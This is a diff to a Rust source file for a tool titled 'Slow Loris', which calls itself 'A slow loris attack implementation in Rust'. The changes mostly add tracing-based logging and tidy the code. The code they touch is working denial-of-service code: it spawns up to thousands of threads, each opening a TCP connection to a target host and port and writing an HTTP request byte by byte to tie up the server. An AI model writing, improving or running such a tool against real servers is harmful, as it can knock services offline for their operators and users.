@@ -1,17 +1,17 @@
 use chrono::Local;
 use console::Term;
-use ctrlc;
+//use dns_lookup::lookup_addr;
+//use dns_lookup::lookup_host;
 use indicatif::{MultiProgress, ProgressBar, ProgressDrawTarget, ProgressStyle};
 use rand::distributions::Alphanumeric;
 use rand::{thread_rng, Rng};
 use std::io::Write;
-use std::net::{IpAddr, Ipv4Addr, Ipv6Addr, TcpStream};
+use std::net::{IpAddr, Ipv4Addr, /*Ipv6Addr,*/ TcpStream};
 use std::sync::{Arc, Mutex};
 use std::thread::{sleep, spawn};
 use std::time::Duration as StdDuration;
-
-use dns_lookup::lookup_addr;
-use dns_lookup::lookup_host;
+use tracing::{event, Level};
+//use tracing_subscriber::fmt::init;
 
 // # IP addresses
 // alias ip="dig +short myip.opendns.com @resolver1.opendns.com"
@@ -39,7 +39,7 @@ impl Args {
             max_connections: 0,
             timeout_min: 0,
             timeout_max: u64::MAX,
-            body_length_min: 0 as usize,
+            body_length_min: 0_usize,
             body_length_max: usize::MAX,
         }
     }
@@ -66,8 +66,8 @@ impl Attrs {
     }
 }
 
-fn get_my_ip() -> Result<String, Box<dyn std::error::Error>> {
-    use std::io;
+fn _get_my_ip() -> Result<String, Box<dyn std::error::Error>> {
+    //use std::io;
     use std::process::Command;
 
     let output = Command::new("dig")
@@ -78,33 +78,48 @@ fn get_my_ip() -> Result<String, Box<dyn std::error::Error>> {
 
     if output.status.success() {
         let ip_address = String::from_utf8_lossy(&output.stdout);
-        Ok(String::from(format!("{}", ip_address.trim())))
+        Ok(ip_address.trim().to_string())
     } else {
         // Convert stderr to a String
         match str::from_utf8(&output.stderr) {
             Ok(error_string) => {
                 eprintln!("Error executing dig command: {}", error_string.trim());
-                Ok(String::from(format!(
-                    "Raw stderr: {:?}",
-                    error_string.trim()
-                )))
+                Ok(format!("Raw stderr: {:?}", error_string.trim()))
             }
             Err(e) => {
                 eprintln!("Error converting stderr to String: {:?}", e);
                 eprintln!("Raw stderr: {:?}", output.stderr);
-                Ok(String::from(format!("Raw stderr: {:?}", output.stderr)))
+                Ok(format!("Raw stderr: {:?}", output.stderr))
             }
         }
     }
 }
 
 fn main() {
+    tracing_subscriber::fmt::init();
+
+    // You can emit different levels of tracing events using macros:
+    //tracing::trace!("This is a trace-level event");
+    //tracing::debug!("This is a debug-level event");
+    //tracing::info!("This is an info-level event");
+    //tracing::warn!("This is a warning-level event");
+    //tracing::error!("This is an error-level event");
+
+    // You can also create and enter spans to represent a period of time
+    // within your application's execution.
+    let span = tracing::span!(Level::INFO, "processing_request", request_id = 123);
+    let _enter = span.enter(); // Enter the span
+
+    event!(Level::DEBUG, "Doing some work within the span");
+    // ... your code that does the work ...
+    event!(Level::INFO, "Finished processing request");
+
     // set the important application variables and states
     let args = Arc::new(parse_args());
     //let host = args.host.clone();
-    //println!("args:{:?}", args);
-    //println!("host:{:?}", args.host);
-    //println!("ip:{:?}", args.ip);
+    tracing::trace!("args:{:?}", args);
+    tracing::trace!("host:{:?}", args.host);
+    tracing::trace!("ip:{:?}", args.ip);
     let attrs = Arc::new(Mutex::new(Attrs::new()));
 
     // create a progress bar
@@ -114,7 +129,7 @@ fn main() {
     progress_bars.set_draw_target(ProgressDrawTarget::stdout_with_hz(10));
     let connection_bar = progress_bars.add(ProgressBar::new(args.max_connections).with_style(
         ProgressStyle::default_bar().template(
-            "Average response time: {msg} ms\n\nSending connections: {pos}/{len}\n{wide_bar}",
+            "Average response time: {msg} ms\nSending connections: {pos}/{len}\n{wide_bar}",
         ),
     ));
     let success_bar = progress_bars.add(ProgressBar::new(100).with_style(
@@ -122,19 +137,20 @@ fn main() {
     ));
 
     // Hide the console cursor and clear the screen
-    //#[cfg(not(test))]
-    //Term::stdout().hide_cursor().unwrap_or_else(|_| {});
-    //#[cfg(not(test))]
-    //Term::stdout()
-    //    .clear_screen()
-    //    .unwrap_or_else(|_| println!("\n\n"));
+    #[cfg(not(test))]
+    #[allow(clippy::unit_arg)]
+    Term::stdout().hide_cursor().unwrap_or({});
+    #[cfg(not(test))]
+    Term::stdout()
+        .clear_screen()
+        .unwrap_or_else(|_| println!("\n\n"));
 
     // change the Ctrl+C behaviour to just exit the process
     ctrlc::set_handler(|| std::process::exit(0)).expect("Could not change ctrl-c behaviour");
-    println!("host:{}", args.host);
-    println!("ip:{:?}", args.ip);
-    println!("body_length_min:{:?}", args.body_length_min);
-    println!("body_length_max:{:?}", args.body_length_max);
+    println!("{}", args.host);
+    println!("{:?}:{:?}", args.ip, args.port);
+    tracing::debug!("body_length_min:{:?}", args.body_length_min);
+    tracing::debug!("body_length_max:{:?}", args.body_length_max);
 
     // it's necessary to create a new thread so the progress-bars are displayed correctly
     spawn(move || {
@@ -151,8 +167,8 @@ fn main() {
                     ((attrs.total_responses as f64 / attrs.total_requests as f64) * 100.0) as u64;
                 current_connections = attrs.current_connections;
                 current_threads = attrs.current_threads;
-                //#[cfg(test)]
-                //println!("current_threads:{:?}", current_threads);
+                #[cfg(test)]
+                tracing::trace!("current_threads:{:?}", current_threads);
             }
 
             // update the progress bar
@@ -162,9 +178,6 @@ fn main() {
 
             // spawn a new thread if not enough connections exists
             if current_threads < args.max_connections {
-                //println!("args={:?}", args);
-                //println!("attrs={:?}", attrs);
-                //println!("args.port={:?}", args.port);
                 let args = Arc::clone(&args);
                 let attrs = Arc::clone(&attrs);
                 let port = args.port;
@@ -173,10 +186,14 @@ fn main() {
                     let mut attrs = attrs.lock().unwrap();
                     attrs.current_threads += 1;
                     attrs.total_requests += 1;
+                    tracing::debug!("current_threads:{:?}", attrs.current_threads);
+                    tracing::debug!("current_threads:{:?}", attrs.total_requests);
                 }
 
                 spawn(move || {
-                    //#[cfg(not(test))]
+                    tracing::debug!("\n{:?}", args);
+                    tracing::debug!("\n{:?}", attrs);
+                    tracing::debug!("\n{:?}", args.port);
                     new_socket(args, attrs, port);
                 });
             }
@@ -189,10 +206,10 @@ fn main() {
 /// parses the arguments given to the application
 fn parse_args() -> Args {
     use clap::{App, Arg};
-    use dns_lookup::{lookup_addr, lookup_host};
+    use dns_lookup::lookup_host;
 
     fn validate_range(string: &str) -> Result<(), String> {
-        if let Ok(_) = parse_range(&string) {
+        if parse_range(string).is_ok() {
             Ok(())
         } else {
             Err(
@@ -202,7 +219,7 @@ fn parse_args() -> Args {
         }
     }
 
-    let args = Args::new();
+    let _ = Args::new(); //just a test
     let matches = App::new("Slow Loris")
         .about("A slow loris attack implementation in Rust")
         .author(clap::crate_authors!())
@@ -229,7 +246,7 @@ fn parse_args() -> Args {
                 .takes_value(true)
                 .default_value("2000")
                 .validator(|connections| {
-                    if let Ok(_) = connections.parse::<u64>() {
+                    if connections.parse::<u64>().is_ok() {
                         Ok(())
                     } else {
                         Err("must be an unsigned integer".to_string())
@@ -268,7 +285,7 @@ fn parse_args() -> Args {
                 .takes_value(true)
                 .default_value("443")
                 .validator(|port| {
-                    if let Ok(_) = port.parse::<u16>() {
+                    if port.parse::<u16>().is_ok() {
                         Ok(())
                     } else {
                         Err("must be an unsigned integer".to_string())
@@ -295,10 +312,12 @@ fn parse_args() -> Args {
         Ok(parsed) => {
             host = dns_lookup::lookup_addr(&parsed).expect("Could not find hostname for given ip");
             ip = parsed;
+            tracing::info!("{}:{}", host, ip);
         }
         Err(_) => {
             host = address.to_string();
             println!("host={}", host);
+            tracing::debug!("{}", host);
 
             //let hostname = "localhost";
             //let ips: Vec<std::net::IpAddr> = lookup_host(hostname).unwrap();
@@ -306,8 +325,9 @@ fn parse_args() -> Args {
 
             //let mut ip: IpAddr = "127.0.0.1".parse().unwrap();
             let socket: SocketAddr = (ip, port).into();
+            tracing::info!("{}", socket);
 
-            //			host = getnameinfo(&socket, 0).unwrap();
+            //host = getnameinfo(&socket, 0).unwrap();
 
             let (name, service) = match getnameinfo(&socket, 0) {
                 Ok((n, s)) => (n, s),
@@ -405,7 +425,7 @@ fn new_socket(args: Arc<Args>, attrs: Arc<Mutex<Attrs>>, port: u16) {
     let request = http_request(&args.host, body_length);
 
     for byte in request.as_bytes() {
-        if let Err(_) = connection.write_all(&[*byte]) {
+        if connection.write_all(&[*byte]).is_err() {
             let mut attrs = attrs.lock().unwrap();
             attrs.current_connections -= 1;
             attrs.current_threads -= 1;
